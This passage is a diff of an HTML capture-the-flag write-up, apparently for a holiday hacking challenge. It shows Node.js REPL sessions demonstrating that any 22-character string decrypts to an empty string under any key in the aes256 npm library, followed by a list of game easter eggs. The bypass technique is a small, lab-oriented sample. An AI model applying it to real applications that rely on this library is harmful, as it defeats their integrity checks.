+<p>
+So, at this point it is clear that something interesting happens around 22-24 chars.
+</p>
+
+<p>
+Trying different lengths approaching a length of 22 continues to throw an error
+for a while&#x2026;
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-js">&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaa'</span>)
+TypeError: Provided <span style="font-style: italic;">"encrypted"</span> must be a non-empty string
+    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:68:13)
+</pre>
+</div>
+
+<p>
+Until the error changes:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-js">&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaa'</span>)
+Error: Invalid IV length
+    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
+    at Object.createDecipheriv (crypto.js:106:10)
+    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
+&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaa'</span>)
+Error: Invalid IV length
+    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
+    at Object.createDecipheriv (crypto.js:106:10)
+    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
+&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaa'</span>)
+Error: Invalid IV length
+    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
+    at Object.createDecipheriv (crypto.js:106:10)
+    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
+&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaa'</span>)
+Error: Invalid IV length
+    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
+    at Object.createDecipheriv (crypto.js:106:10)
+    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
+&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaa'</span>)
+Error: Invalid IV length
+    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
+    at Object.createDecipheriv (crypto.js:106:10)
+    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
+&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaa'</span>)
+<span style="font-style: italic;">''</span>
+&gt; <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaa'</span>.length
+22
+&gt; aes256.decrypt(<span style="font-style: italic;">'key really does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaa'</span>)
+<span style="font-style: italic;">''</span>
+</pre>
+</div>
+
+<p>
+Success!  A string of any 22 chars will decrypt to the empty string.
+</p>
+
+<p>
+An alternative approach would be to edit the aes library and comment out this block:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-js"><span style="font-weight: bold;">if</span> (<span style="font-weight: bold;">typeof</span> plaintext !== <span style="font-style: italic;">'string'</span> || !plaintext) {
+  <span style="font-weight: bold;">throw</span> <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">TypeError</span>(<span style="font-style: italic;">'Provided "plaintext" must be a non-empty string'</span>);
+}
+</pre>
+</div>
+
+<p>
+With the throw commented out, we can encrypt an empty string:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-js">&gt; <span style="font-weight: bold;">var</span> <span style="font-weight: bold; font-style: italic;">aes256</span> = require(<span style="font-style: italic;">'aes256'</span>);
+&gt; aes256.encrypt(<span style="font-style: italic;">'whatever'</span>, <span style="font-style: italic;">''</span>)
+<span style="font-style: italic;">'SStLU1QxLjmtG/Ea8hMH0Q=='</span>
+&gt; ct=aes256.encrypt(<span style="font-style: italic;">'whatever'</span>, <span style="font-style: italic;">''</span>)
+<span style="font-style: italic;">'tYcVb4PRsdq4JWl5XMSNgw=='</span>
+&gt; aes256.decrypt(<span style="font-style: italic;">'a different key entirely'</span>, ct)
+<span style="font-style: italic;">''</span>
+&gt; ct.length
+24
+</pre>
+</div>
+
+<p>
+The length is different(24 instead of 22), but only because it is padded with 2
+bytes of == for base64 purposes.
+</p>
+</div>
+</li></ul>
 </li>
 
 <li><a id="alternatives" name="alternatives"></a><a id="sec-6-4-1-6" name="sec-6-4-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
@@ -4085,8 +4706,36 @@ system?
 <div id="outline-container-sec-7" class="outline-2">
 <h2 id="sec-7">Easter Eggs</h2>
 <div class="outline-text-2" id="text-7">
-</div><div id="outline-container-sec-7-1" class="outline-3">
-<h3 id="sec-7-1"><span class="todo TODO">TODO</span> List Easter Eggs here</h3>
+</div><div id="outline-container-title" class="outline-3">
+<h3 id="title"><a id="sec-7-1" name="sec-7-1"></a>Easter Eggs</h3>
+<div class="outline-text-3" id="text-title">
+</div>
+
+<div id="outline-container-sec-7-1-1" class="outline-4">
+<h4 id="sec-7-1-1">Story Page</h4>
+</div>
+</div>
+
+<div id="outline-container-sec-7-2" class="outline-3">
+<h3 id="sec-7-2">Wintered logo is based on the Wicked stage musical poster.</h3>
+</div>
+<div id="outline-container-sec-7-3" class="outline-3">
+<h3 id="sec-7-3">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</h3>
+<div class="outline-text-3" id="text-7-3">
+</div><div id="outline-container-sec-7-3-1" class="outline-4">
+<h4 id="sec-7-3-1">North Pole and Beyond</h4>
+<div class="outline-text-4" id="text-7-3-1">
+</div><ul class="org-ul"><li><a id="sec-7-3-1-1" name="sec-7-3-1-1"></a>Games<br  /></li>
+
+<li><a id="sec-7-3-1-2" name="sec-7-3-1-2"></a>Scoreboard<br  /></li>
+
+<li><a id="sec-7-3-1-3" name="sec-7-3-1-3"></a>Stocking<br  /><div class="outline-text-5" id="text-7-3-1-3">
+<p>
+The text field for entering the SHA1 hashes of the great book pages appears to have some placeholder text in it, <code>686579212121202d436f756e746572204861636b</code>. This is in hex and can be converted to ascii, <code>hey!!! -Counter Hack</code>.
+</p>
+</div>
+</li></ul>
+</div>
 </div>
 </div>
 <div id="outline-container-sec-8" class="outline-2">
